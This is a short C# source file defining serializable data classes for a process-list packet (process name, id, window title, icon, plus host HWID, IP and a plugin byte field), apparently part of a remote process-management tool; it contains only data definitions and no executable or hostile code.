using System;
using System.Collections.Generic;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class Proc
    {
        public byte[] processIcon { get; set; }
        public int processId { get; set; }
        public string processName { get; set; }
        public string processWindowTitle { get; set; }
        public string processWindowHandle { get; set; }
        public string is64Bit { get; set; }
    }

    [Serializable]
    public class ProcessManagerPacket : IPacket
    {
        public ProcessManagerPacket() : base() 
        {
            this.PacketType = PacketType.PM_GET_PROCESSES;
        }

        public ProcessManagerPacket(List<Proc> processes, string baseIp, string HWID) : base()
        {
          
            PacketType = PacketType.PM_GET_PROCESSES;
            this.BaseIp = baseIp;
            this.HWID = HWID;  
            
            this.processes = processes;
        }

        public string HWID { get; set; }
        public string BaseIp { get; set; }
        public byte[] Plugin { get; set; }
        public PacketType PacketType { get; }
        public PacketState PacketState { get; set; }
        public string Status { get; set; }
        public string DatePacketStatus { get; set; }
        public int PacketSize { get; set; }

        public List<Proc> processes { get; set; }
    }
}
